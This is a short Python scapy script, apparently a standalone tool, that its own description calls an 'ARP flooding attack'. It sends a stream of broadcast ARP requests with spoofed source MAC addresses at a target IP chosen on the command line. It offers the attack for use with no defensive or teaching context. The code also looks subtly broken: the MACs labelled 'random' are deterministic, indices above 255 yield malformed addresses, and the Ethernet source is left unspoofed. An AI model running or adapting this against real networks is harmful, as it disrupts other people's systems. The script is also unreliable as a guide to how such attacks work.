import argparse
import time
from scapy.all import ARP, Ether, sendp

def arp_flood_attack(ip, num_macs):
    for i in range(num_macs):
        # Generate random MAC address
        mac_address = "02:00:00:%02x:%02x:%02x" % (i, i, i)

        # Create ARP request packet
        arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_address)

        # Send ARP request packet
        sendp(arp_packet, verbose=False)

        # Sleep for a short duration to avoid overwhelming the network
        time.sleep(0.01)

if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="Perform ARP flooding attack")
    parser.add_argument("ip", help="IP address to perform ARP flooding attack on")
    parser.add_argument("num_macs", type=int, help="Number of MAC addresses to send")
    args = parser.parse_args()

    # Perform ARP flooding attack
    arp_flood_attack(args.ip, args.num_macs)